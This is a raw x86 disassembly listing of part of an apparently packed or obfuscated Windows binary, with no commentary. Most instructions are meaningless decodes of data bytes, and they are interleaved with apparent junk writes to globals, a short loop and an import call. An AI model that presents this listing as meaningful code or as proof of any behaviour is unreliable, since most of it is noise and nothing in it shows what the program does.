  40a58c:	xchg   esi,eax
  40a58d:	adc    DWORD PTR [ecx-0x3e],ecx
  40a590:	mov    ds:0x12f18832,eax
  40a595:	pop    ds
  40a596:	cdq    
  40a597:	cmp    DWORD PTR [ebx],edx
  40a599:	xor    dh,bh
  40a59b:	and    ebp,edx
  40a59d:	cli    
  40a59e:	lods   al,BYTE PTR ds:[esi]
  40a59f:	inc    eax
  40a5a0:	pushf  
  40a5a1:	out    0x13,al
  40a5a3:	mov    ds:0x3c65c134,al
  40a5a8:	inc    edi
  40a5a9:	lods   al,BYTE PTR ds:[esi]
  40a5aa:	hlt    
  40a5ab:	cmp    BYTE PTR [edi-0x19],cl
  40a5ae:	mov    ds:0x94784556,eax
  40a5b3:	sub    al,0xdd
  40a5b5:	inc    ebp
  40a5b6:	xchg   DWORD PTR [edi],esp
  40a5b8:	fadd   QWORD PTR [eax+0x77]
  40a5bb:	push   ds
  40a5bc:	dec    ebx
  40a5bd:	aas    
  40a5be:	(bad)  
  40a5bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5c0:	hlt    
  40a5c1:	jg     0x40a54e
  40a5c3:	popa   
  40a5c4:	adc    eax,eax
  40a5c6:	sub    DWORD PTR [ebp-0x54],esp
  40a5c9:	mov    ch,0xd0
  40a5cb:	push   esp
  40a5cc:	xor    BYTE PTR [ecx],dl
  40a5ce:	(bad)  
  40a5cf:	pop    ebx
  40a5d0:	popa   
  40a5d1:	aas    
  40a5d2:	jl     0x40a5b8
  40a5d4:	out    0x63,eax
  40a5d6:	js     0x40a5f3
  40a5d8:	push   0xc92a685f
  40a5dd:	imul   ecx,ebx,0x34deb8db
  40a5e3:	jge    0x40a5ef
  40a5e5:	sbb    DWORD PTR [edx+0x470fc5fa],edi
  40a5eb:	scas   eax,DWORD PTR es:[edi]
  40a5ec:	(bad)  
  40a5ed:	repnz imul edx,DWORD PTR [ebx-0x4a],0x1f
  40a5f2:	(bad)  
  40a5f4:	xchg   ecx,eax
  40a5f5:	cmp    BYTE PTR [ebp+0x7ca6d07e],al
  40a5fb:	pop    eax
  40a5fc:	add    ebx,ebp
  40a5fe:	add    dh,BYTE PTR [ebp+0x22]
  40a601:	fs cmp al,0xc2
  40a604:	jnp    0x40a5c3
  40a606:	xor    eax,0x411bb097
  40a60b:	adc    cl,0xc3
  40a60e:	popa   
  40a60f:	inc    ebx
  40a610:	shl    DWORD PTR [edx+0x5a],0xec
  40a614:	mov    edi,0xc2a14626
  40a619:	(bad)  
  40a61a:	sahf   
  40a61b:	out    0x83,al
  40a61d:	je     0x40a61a
  40a61f:	and    al,0xe1
  40a621:	xchg   ebp,eax
  40a622:	stos   BYTE PTR es:[edi],al
  40a623:	jg     0x40a5e8
  40a625:	mov    dl,0x18
  40a627:	xchg   esi,eax
  40a628:	push   es
  40a629:	ss pop ecx
  40a62b:	lock xchg edi,eax
  40a62d:	xchg   ebp,eax
  40a62e:	sti    
  40a62f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a630:	clc    
  40a631:	mov    ds:0x554825d2,eax
  40a636:	jae    0x40a626
  40a638:	jmp    0xa7685fdb
  40a63d:	sbb    al,0x3f
  40a63f:	stos   BYTE PTR es:[edi],al
  40a640:	int    0x74
  40a642:	es retf 
  40a644:	inc    ebx
  40a645:	mov    dl,0x0
  40a647:	inc    ebp
  40a648:	jmp    0x40a631
  40a64a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a64b:	dec    ecx
  40a64c:	test   eax,0x506cdc3f
  40a651:	mov    ch,0xa9
  40a653:	cld    
  40a654:	cld    
  40a655:	or     DWORD PTR [ebx+0x40],edx
  40a658:	push   eax
  40a659:	dec    ah
  40a65b:	test   eax,0x97e3d192
  40a660:	mov    ah,0x86
  40a662:	adc    DWORD PTR [ebx],ebp
  40a664:	dec    ebx
  40a665:	pop    eax
  40a666:	sub    DWORD PTR [ecx],ebp
  40a668:	push   edx
  40a669:	jb     0x40a671
  40a66b:	jg     0x40a676
  40a66d:	jo     0x40a67e
  40a66f:	nop
  40a670:	mov    esp,0x6a9a4e
  40a675:	cwde   
  40a676:	mov    dh,0x37
  40a678:	xor    BYTE PTR [ecx-0x46],cl
  40a67b:	lahf   
  40a67c:	inc    edx
  40a67d:	add    BYTE PTR [ecx],bh
  40a67f:	xchg   BYTE PTR [ecx-0x21a300ec],ah
  40a685:	out    dx,al
  40a686:	mov    edi,0x96946454
  40a68b:	pop    ss
  40a68c:	(bad)  
  40a68e:	jp     0x40a62f
  40a690:	lods   eax,DWORD PTR ds:[esi]
  40a691:	bound  esi,QWORD PTR [ebp-0x37]
  40a694:	sbb    eax,0xa3573ac8
  40a699:	push   0x65cfaabc
  40a69e:	mov    ebx,0x7c5da314
  40a6a3:	add    BYTE PTR [ebx],dh
  40a6a5:	mov    ebp,0x5a3019d8
  40a6aa:	push   esi
  40a6ab:	mov    ss,ebp
  40a6ad:	test   DWORD PTR ds:0x69b32d0f,0x9eef1909
  40a6b7:	xchg   edx,eax
  40a6b8:	cmp    ebp,DWORD PTR [ecx]
  40a6ba:	(bad)  
  40a6bb:	sbb    DWORD PTR [ebx+eax*8-0x7bf75a13],ecx
  40a6c2:	sbb    cl,BYTE PTR [edi-0x2759494a]
  40a6c8:	(bad)  
  40a6c9:	in     eax,dx
  40a6ca:	popw   ss
  40a6cc:	das    
  40a6cd:	or     eax,0x37d2770b
  40a6d2:	inc    eax
  40a6d3:	push   cs
  40a6d4:	push   ecx
  40a6d5:	pop    edx
  40a6d6:	sbb    BYTE PTR [edi-0x57b91fa6],dh
  40a6dc:	pop    ecx
  40a6dd:	cmp    BYTE PTR es:[edi],0x66
  40a6e1:	out    dx,al
  40a6e2:	cwde   
  40a6e3:	pop    ds
  40a6e4:	mov    eax,ds:0xc3429a34
  40a6e9:	repnz sbb DWORD PTR [esi],ecx
  40a6ec:	cmp    edi,DWORD PTR [ebx]
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43376b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433757,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4337e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433817
  40a72f:	or     DWORD PTR ds:0x433823,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433813,0x433707
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4337af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433767,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4337ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4336ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4337db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43370b
  40a793:	sub    DWORD PTR ds:0x433723,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xc377ec0c
  40a7ac:	jns    0x40a7a7
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7b7:	call   0x37f1d4e9
  40a7bc:	push   es
  40a7bd:	xor    DWORD PTR [ebp+0x1f065c1b],0xffffffa7
  40a7c4:	push   cs
  40a7c5:	and    bh,bh
  40a7c7:	fcmovbe st,st(7)
  40a7c9:	and    al,0x2b
  40a7cb:	(bad)  
  40a7cc:	adc    al,0xda
  40a7ce:	repz cmp eax,0xad960609
  40a7d4:	es adc al,0x6f
  40a7d7:	dec    edx
  40a7d8:	and    eax,DWORD PTR [esi+0x75594a87]
  40a7de:	cmp    DWORD PTR [bx+0x7194],0xfa6cdfba
  40a7e7:	jb     0x40a81c
  40a7e9:	mov    al,0xc0
  40a7eb:	jmp    0x40a816
  40a7ed:	jl     0x40a77d
  40a7ef:	push   ecx
  40a7f0:	adc    BYTE PTR [edx+0x1e],bl
  40a7f3:	xor    ecx,esp
  40a7f5:	inc    edi
  40a7f6:	sbb    ah,BYTE PTR [ebx+0xb]
  40a7f9:	lahf   
  40a7fa:	adc    al,0x50
  40a7fc:	cmp    edi,DWORD PTR [ebx+0x63]
  40a7ff:	push   0x35
  40a801:	xor    al,BYTE PTR [eax+0x33]
  40a804:	addr16 (bad) 
  40a806:	ds dec esi
  40a808:	sub    al,0x6e
  40a80a:	dec    esp
  40a80b:	call   0xda67d040
  40a810:	mov    eax,0xb484683e
  40a815:	into   
  40a816:	(bad)  
  40a817:	hlt    
  40a818:	nop
  40a819:	jno    0x40a85d
  40a81b:	test   eax,0xa216cca4
  40a820:	sbb    ecx,0xaa0a497
  40a826:	hlt    
  40a827:	outs   dx,DWORD PTR ds:[esi]
  40a828:	xchg   esi,eax
  40a829:	clc    
  40a82a:	fcmovnu st,st(3)
  40a82c:	pop    edi
  40a82d:	push   ebx
  40a82e:	inc    eax
  40a82f:	in     al,dx
  40a830:	mov    DWORD PTR [edi+0x5913b056],edi
  40a836:	mov    edi,0x85778356
  40a83b:	stc    
  40a83c:	fisttp DWORD PTR [ebx-0x7282bbfa]
  40a842:	(bad)  
  40a843:	jle    0x40a892
  40a845:	int    0xca
  40a847:	add    al,bh
  40a849:	xor    BYTE PTR [esi+0x66],bh
  40a84c:	adc    al,BYTE PTR [esi-0x49]
  40a84f:	mov    BYTE PTR [esi],ch
  40a851:	mov    DWORD PTR [edi-0x1b38f4ab],edx
  40a857:	cmp    BYTE PTR [edi-0x4780ba6d],dh
  40a85d:	rcr    DWORD PTR [eax-0x41],1
  40a860:	cmp    eax,DWORD PTR [edi-0x79]
  40a863:	xchg   ecx,eax
  40a864:	adc    esp,DWORD PTR [eax-0x3b]
  40a867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a868:	ins    DWORD PTR es:[edi],dx
  40a869:	sbb    ebx,DWORD PTR [edx+0x52feb55f]
  40a86f:	icebp  
  40a870:	xchg   edx,eax
  40a871:	ins    BYTE PTR es:[edi],dx
  40a872:	pop    edx
  40a873:	std    
  40a874:	adc    edi,DWORD PTR [eax]
  40a876:	and    edi,DWORD PTR [ecx]
  40a878:	mov    esp,0x6530efdf
  40a87d:	nop
  40a87e:	and    BYTE PTR [edx-0x59],al
  40a881:	sub    DWORD PTR [edi+esi*4],esp
  40a884:	imul   edi,DWORD PTR [esp+edx*8-0x2d],0x3964768c
  40a88c:	xchg   edx,eax
  40a88d:	xchg   esi,eax
  40a88e:	inc    ebx
  40a88f:	jecxz  0x40a81a
  40a891:	jle    0x40a8bd
  40a893:	jo     0x40a87c
  40a895:	lods   eax,DWORD PTR ds:[esi]
  40a896:	dec    ebx
  40a897:	inc    ebp
  40a898:	test   DWORD PTR [ebx+ebp*4-0x60],ecx
  40a89c:	dec    ebx
  40a89d:	in     al,0x31
  40a89f:	icebp  
  40a8a0:	mov    esp,0xe0811c56
  40a8a5:	pop    edi
  40a8a6:	mov    ebp,DWORD PTR [ecx+ebp*2]
  40a8a9:	test   al,0xb5
  40a8ab:	mov    dh,0xee
  40a8ad:	fwait
  40a8ae:	mov    edi,DWORD PTR [eax+0x78ffa033]
  40a8b4:	std    
  40a8b5:	aaa    
  40a8b6:	in     al,0x2d
  40a8b8:	mov    ebp,0xe4787cdc
  40a8bd:	cwde   
  40a8be:	sbb    ebx,esp
  40a8c0:	js     0x40a890
  40a8c2:	retf   
  40a8c3:	sub    DWORD PTR [eax+0xd78ca16],ebp
  40a8c9:	jp     0x40a88e
  40a8cb:	pop    edi
  40a8cc:	(bad)  
  40a8cd:	and    esp,ebx
  40a8cf:	mov    cl,0x24
  40a8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8d2:	pop    esp
  40a8d3:	shl    bh,0x37
  40a8d6:	je     0x40a94e
  40a8d8:	add    bl,bh
  40a8da:	and    eax,ebx
  40a8dc:	nop
  40a8dd:	mov    al,0x52
  40a8df:	add    DWORD PTR [edi],edi
  40a8e1:	xor    ebp,DWORD PTR [ebx+0x336ad63]
  40a8e7:	mov    eax,0x63ae37cc
  40a8ec:	and    ah,BYTE PTR [edx]
  40a8ee:	or     dl,al
  40a8f0:	loop   0x40a8f5
  40a8f2:	inc    edi
  40a8f3:	test   DWORD PTR [ebp-0x207d9ae2],eax
  40a8f9:	loopne 0x40a8e1
  40a8fb:	push   ss
  40a8fc:	lods   eax,DWORD PTR ds:[esi]
  40a8fd:	and    DWORD PTR [ebx-0x7],eax
  40a900:	je     0x40a94d
  40a902:	imul   eax,DWORD PTR [eax+0x70],0x37
  40a906:	dec    edx
  40a907:	add    al,0x33
  40a909:	loope  0x40a8b4
  40a90b:	xchg   ebp,eax
  40a90c:	xlat   BYTE PTR ds:[ebx]
  40a90d:	fidiv  WORD PTR [ecx-0x58742a7e]
  40a913:	scas   al,BYTE PTR es:[edi]
  40a914:	enter  0xe21e,0x25
  40a918:	inc    edx
  40a919:	aad    0xa5
  40a91b:	les    ecx,FWORD PTR [edx-0x5add338f]
  40a921:	push   edx
  40a922:	xor    al,0xbe
  40a924:	cs pop ecx
  40a926:	aad    0x7a
  40a928:	hlt    
  40a929:	call   0xa69aab0d
  40a92e:	mov    ecx,0xc5aa15e4
  40a933:	ror    dh,1
  40a935:	jne    0x40a8c9
  40a937:	ret    0xf553
  40a93a:	jg     0x40a992
  40a93c:	sbb    bh,BYTE PTR [eax+0x77]
  40a93f:	fisttp DWORD PTR [edx+0x3e]
  40a942:	push   esi
  40a943:	dec    eax
  40a944:	into   
  40a945:	xchg   esp,eax
  40a946:	sbb    ah,bh
  40a948:	sub    eax,0xba7141fb
  40a94d:	jae    0x40a953
  40a94f:	(bad)
  40a952:	fcmovnb st,st(6)
  40a954:	sbb    esp,esp
  40a956:	add    BYTE PTR [edx-0x6f],al
  40a959:	cli    
  40a95a:	inc    esi
  40a95b:	xor    al,0xb8
  40a95d:	pop    eax
  40a95e:	adc    al,0x1b
  40a960:	inc    ecx
  40a961:	out    0x19,eax
  40a963:	adc    al,0xbb
  40a965:	and    BYTE PTR ds:0x94ee1062,bh
  40a96b:	loope  0x40a92c
  40a96d:	push   es
  40a96e:	xchg   edx,eax
  40a96f:	cmp    DWORD PTR [edi+0xf],0xdc6f2d14
  40a976:	jecxz  0x40a97a
  40a978:	dec    ebp
  40a979:	mov    DWORD PTR [esi],eax
  40a97b:	ja     0x40a928
  40a97d:	or     BYTE PTR [edx],cl
  40a97f:	outs   dx,DWORD PTR ds:[esi]
  40a980:	fcom   DWORD PTR [ecx+eiz*8+0x31]
  40a984:	iret   
  40a985:	xor    dl,BYTE PTR [ebx-0x42]
  40a988:	fidiv  DWORD PTR [ebp+edi*8+0x1]
  40a98c:	lods   eax,DWORD PTR ds:[esi]
  40a98d:	mov    ch,0xf7
  40a98f:	rol    BYTE PTR [bx],0xb1
  40a993:	popf   
  40a994:	mov    eax,ds:0x1ff53f1
  40a999:	enter  0x21bb,0xff
  40a99d:	inc    ebx
  40a99e:	push   0xc6b6865e
  40a9a3:	std    
  40a9a4:	test   eax,0xeeb1e0c5
  40a9a9:	mov    edx,0x9508402b
  40a9ae:	nop
  40a9af:	fsubr  QWORD PTR [ecx+0x70]
  40a9b2:	dec    ecx
  40a9b3:	ret    
  40a9b4:	xor    DWORD PTR [ebp*2-0x4dd17b6f],edi
  40a9bb:	rol    BYTE PTR [eax+0x4a],0x46
  40a9bf:	jo     0x40a966
  40a9c1:	int    0x65
  40a9c3:	mov    esp,0xa520cae1
  40a9c8:	push   ebx
  40a9c9:	push   ecx
  40a9ca:	call   0xc541:0x720da26f
  40a9d1:	push   edx
  40a9d2:	push   ebx
  40a9d3:	lock call 0xe8a6a392
  40a9d9:	pop    esi
  40a9da:	bound  ebp,QWORD PTR [ebp+ecx*2+0x53]
  40a9de:	ret    0x85bf
  40a9e1:	dec    esp
  40a9e2:	addr16 jno 0x40aa1f
  40a9e5:	push   esi
  40a9e6:	sub    DWORD PTR [eax],0x223a53b1
  40a9ec:	xor    eax,0x82631600
  40a9f1:	js     0x40aa3f
  40a9f3:	xchg   ebx,eax
  40a9f4:	xor    eax,0x61f63c7a
  40a9f9:	xor    edx,eax
  40a9fb:	add    eax,0x8bec4589
  40aa00:	inc    ebp
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433717,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433817,0x4337e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433767,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	add    ah,BYTE PTR [eax+edi*4]
  40aa37:	ret    
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa41:	ins    BYTE PTR es:[edi],dx
  40aa42:	fistp  DWORD PTR [eax+0x1245e818]
  40aa48:	test   al,0x22
  40aa4a:	mov    edx,0x4e6459ef
  40aa4f:	jle    0x40aaaf
  40aa51:	jbe    0x40aa86
  40aa53:	fisubr DWORD PTR [edx-0x2ef0498b]
  40aa59:	sbb    DWORD PTR [eax+0x1e],ebp
  40aa5c:	mov    al,0x70
  40aa5e:	lds    edi,FWORD PTR [edi]
  40aa60:	(bad)  
  40aa61:	push   0x4419fec1
  40aa66:	pusha  
  40aa67:	loope  0x40aa4d
  40aa69:	loope  0x40aa17
  40aa6b:	in     al,0x37
  40aa6d:	out    0x4b,eax
  40aa6f:	outs   dx,DWORD PTR ds:[esi]
  40aa70:	das    
  40aa71:	pop    ebp
  40aa72:	inc    ebx
  40aa73:	xor    edi,ecx
  40aa75:	or     DWORD PTR [esi],esi
  40aa77:	paddsb mm5,QWORD PTR [ecx-0xaa5c481]
  40aa7e:	xchg   esi,eax
  40aa7f:	sti    
  40aa80:	or     cl,ch
  40aa82:	sub    al,BYTE PTR [edi+0x5a]
  40aa85:	gs push edi
  40aa87:	jo     0x40aaf5
  40aa89:	inc    edx
  40aa8a:	jns    0x40aa9d
  40aa8c:	push   eax
  40aa8d:	sub    DWORD PTR [edx-0x32],esp
  40aa90:	popf   
  40aa91:	pop    edx
  40aa92:	add    DWORD PTR [ecx],esp
  40aa94:	std    
  40aa95:	nop
  40aa96:	fwait
  40aa97:	pop    eax
  40aa98:	call   0x95e013ee
  40aa9d:	pop    ds
  40aa9e:	adc    al,0xb0
  40aaa0:	fnstenv [edx+0x4328cae6]
  40aaa6:	clc    
  40aaa7:	jbe    0x40aa57
  40aaa9:	lods   al,BYTE PTR ds:[esi]
  40aaaa:	adc    BYTE PTR [esi+0x47b6b28],ch
  40aab0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aab1:	pop    ds
  40aab2:	pushf  
  40aab3:	mov    ?,WORD PTR [edi-0xe]
  40aab6:	mov    eax,0xf24e924
  40aabb:	mov    ch,0x3c
  40aabd:	add    eax,0x40651942
  40aac2:	mov    cl,0x72
  40aac4:	neg    BYTE PTR [ecx]
  40aac6:	bnd jo 0x40ab45
  40aac9:	cmp    BYTE PTR es:[ebx+0x6e],bl
  40aacd:	dec    ecx
  40aace:	int3   
  40aacf:	jbe    0x40aa9d
  40aad1:	aad    0x75
  40aad3:	jbe    0x40ab2c
  40aad5:	sub    al,0xc8
  40aad7:	aam    0x84
  40aad9:	(bad)  
  40aada:	hlt    
  40aadb:	fs or  ch,dh
  40aade:	add    eax,0xb38e111c
  40aae3:	loopne 0x40aaae
  40aae5:	icebp  
  40aae6:	push   eax
  40aae7:	fcom   st(6)
  40aae9:	dec    ebx
  40aaea:	push   eax
  40aaeb:	cmp    dh,BYTE PTR [edx+ebp*4-0x46402c9d]
  40aaf2:	bound  eax,QWORD PTR [eax]
  40aaf4:	ret    0x6a23
  40aaf7:	mov    ecx,0x66ba0914
  40aafc:	xchg   dh,ah
  40aafe:	outs   dx,DWORD PTR ds:[esi]
  40aaff:	push   esi
  40ab00:	push   ebx
  40ab01:	int    0x6d
  40ab03:	out    dx,eax
  40ab04:	(bad)  [ebx]
  40ab06:	das    
  40ab07:	jmp    ecx
  40ab09:	cmp    eax,0xf32d5001
  40ab0e:	push   ebp
  40ab0f:	push   es
  40ab10:	pop    es
  40ab11:	push   esi
  40ab12:	jp     0x40aab1
  40ab14:	push   ds
  40ab15:	arpl   WORD PTR [ecx+edx*2],dx
  40ab18:	mov    ebp,es
  40ab1a:	outs   dx,DWORD PTR ds:[esi]
  40ab1b:	xor    DWORD PTR [eax-0x18209d62],0x9a58b9c
  40ab25:	sub    bl,dh
  40ab27:	mov    ds:0x6e683841,al
  40ab2c:	cmp    ah,BYTE PTR [ebx]
  40ab2e:	je     0x40ab18
  40ab30:	push   ecx
  40ab31:	das    
  40ab32:	jae    0x40ab94
  40ab34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab35:	jle    0x40ab8d
  40ab37:	or     eax,0x96925032
  40ab3c:	loope  0x40ab79
  40ab3e:	in     eax,dx
  40ab3f:	inc    ecx
  40ab40:	(bad)  
  40ab41:	hlt    
  40ab42:	(bad)  
  40ab43:	mov    al,0xb5
  40ab45:	mov    ds:0x7cc9f6c9,al
  40ab4a:	adc    esp,0xffffff8a
  40ab4d:	std    
  40ab4e:	aas    
  40ab4f:	jnp    0x40ab49
  40ab51:	or     al,0xa5
  40ab53:	cs dec eax
  40ab55:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40ab57:	push   cs
  40ab58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab59:	in     al,0x3d
  40ab5b:	xchg   edi,eax
  40ab5c:	(bad)  
  40ab5e:	mov    ds:0x37207934,eax
  40ab63:	sbb    al,BYTE PTR [edi-0x764913d2]
  40ab69:	dec    esi
  40ab6a:	popf   
  40ab6b:	xchg   edi,eax
  40ab6c:	rcr    BYTE PTR [esi-0x48108bf9],1
  40ab72:	sub    DWORD PTR ds:0xafbc3e9b,0xffffffca
  40ab79:	mov    WORD PTR [edx],?
  40ab7b:	push   es
  40ab7c:	or     ch,BYTE PTR [ecx]
  40ab7e:	mov    ?,WORD PTR ds:0x263dbd66
  40ab84:	adc    BYTE PTR [ecx+eax*1],0x9e
  40ab88:	jne    0x40ab23
  40ab8a:	lea    ebp,[ebp+0x23433807]
  40ab90:	(bad)  
  40ab91:	pop    esi
  40ab92:	mov    esi,DWORD PTR [ecx+edi*1+0x35]
  40ab96:	sbb    DWORD PTR [ebx],edx
  40ab98:	or     bl,ch
  40ab9a:	xor    ah,BYTE PTR [edx]
  40ab9c:	aas    
  40ab9d:	inc    edx
  40ab9e:	jge    0x40abbf
  40aba0:	inc    esi
  40aba1:	mov    dl,0x66
  40aba3:	adc    edx,DWORD PTR [edx+0xc770336]
  40aba9:	sub    eax,0xca958468
  40abae:	test   DWORD PTR gs:[edx-0x177e650],eax
  40abb5:	xor    cl,BYTE PTR [ecx+0x7363a0eb]
  40abbb:	cli    
  40abbc:	add    DWORD PTR [edi+eax*2],edi
  40abbf:	pop    ebx
  40abc0:	fcomp  QWORD PTR [edx+eax*1-0x4]
  40abc4:	mov    edi,0xfa6d9ba0
  40abc9:	aas    
  40abca:	fnstsw WORD PTR [ecx+0x37]
  40abcd:	inc    esp
  40abce:	ret    
  40abcf:	jae    0x40ab68
  40abd1:	xchg   esi,eax
  40abd2:	fmul   QWORD PTR [eax+0x34]
  40abd5:	adc    eax,0xd21663f7
  40abda:	cmp    eax,0x350985b3
  40abdf:	out    dx,al
  40abe0:	daa    
  40abe1:	sbb    BYTE PTR [ebx],ch
  40abe3:	inc    edi
  40abe4:	push   cs
  40abe5:	sbb    al,0x37
  40abe7:	outs   dx,DWORD PTR ds:[esi]
  40abe8:	push   ebp
  40abe9:	cs mov ebx,0x843946d3
  40abef:	dec    ecx
  40abf0:	jp     0x40ac17
  40abf2:	sbb    eax,edi
  40abf4:	inc    edx
  40abf5:	xchg   edx,eax
  40abf6:	leave  
  40abf7:	xor    DWORD PTR ds:[esi+0x29],ebx
  40abfb:	cmc    
  40abfc:	inc    esi
  40abfd:	mov    eax,ds:0xcdc6effc
  40ac02:	xchg   esi,eax
  40ac03:	or     al,0x8d
  40ac05:	ficom  DWORD PTR [eax+0x29]
  40ac08:	and    dl,ah
  40ac0a:	vpmaxub ymm4,ymm6,YMMWORD PTR [edx-0x628d3a4d]
  40ac12:	mov    ebx,0xf575ecd1
  40ac17:	bound  edi,QWORD PTR [eax+0x7]
  40ac1a:	mov    al,BYTE PTR [ebx+0x4cf82847]
  40ac20:	jg     0x40abcf
  40ac22:	or     al,0x36
  40ac24:	xchg   ebp,eax
  40ac25:	test   eax,0xc2dfb3cc
  40ac2a:	ins    DWORD PTR es:[edi],dx
  40ac2b:	mov    ah,0xda
  40ac2d:	ret    0x8666
  40ac30:	int    0x8b
  40ac32:	das    
  40ac33:	cmp    dl,bh
  40ac35:	or     ecx,edi
  40ac37:	sub    al,BYTE PTR [edx]
  40ac39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac3a:	xchg   ebx,eax
  40ac3b:	int    0xfd
  40ac3d:	inc    ebx
  40ac3e:	mov    ?,WORD PTR [edx+0x64]
  40ac41:	mov    ch,al
  40ac43:	jle    0x40ac08
  40ac45:	arpl   di,cx
  40ac47:	or     BYTE PTR [esi+0x6a],bh
  40ac4a:	pop    ecx
  40ac4b:	call   0xc8bcf93d
  40ac50:	sub    ah,BYTE PTR [edi+0x6be12d]
  40ac56:	dec    eax
  40ac57:	xor    DWORD PTR [edi],esi
  40ac59:	(bad)  
  40ac5a:	push   ebx
  40ac5b:	jno    0x40acc6
  40ac5d:	jge    0x40ac8b
  40ac5f:	in     eax,0x18
  40ac61:	stc    
  40ac62:	jmp    0x6117c1ae
  40ac67:	mov    cl,0xf0
  40ac69:	jmp    0x7047e1ca
  40ac6e:	dec    ebp
  40ac6f:	dec    esp
  40ac70:	ret    0x868e
  40ac73:	push   edx
  40ac74:	jo     0x40ace2
  40ac76:	in     eax,dx
  40ac77:	pop    ss
  40ac78:	lods   al,BYTE PTR ds:[esi]
  40ac79:	pusha  
  40ac7a:	push   esp
  40ac7b:	stc    
  40ac7c:	jns    0x40acd7
  40ac7e:	mov    edx,0x72b5af51
  40ac83:	and    cl,bl
  40ac85:	push   0x840fc83b
  40ac8a:	pop    edi
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [edi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	aaa    
  40ac9f:	inc    ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4337ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4337ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4337ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433888
  40acc6:	push   0x4338cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4337ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4337ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4337ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4337ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43379f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x33b6a62e],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad66
  40ad2c:	push   ds
  40ad2d:	xchg   ecx,eax
  40ad2e:	and    esi,ebx
  40ad30:	mov    ebp,ebp
  40ad32:	jp     0x40ad16
  40ad34:	cmp    ch,BYTE PTR [esi]
  40ad36:	mov    esi,0x51b815fd
  40ad3b:	mov    ch,0x33
  40ad3d:	inc    eax
  40ad3e:	pop    es
  40ad3f:	pop    esp
  40ad40:	fs je  0x40ad46
  40ad43:	lds    eax,FWORD PTR [ebp+0x20fd62a]
  40ad49:	dec    eax
  40ad4a:	stos   DWORD PTR es:[edi],eax
  40ad4b:	retf   0xaea7
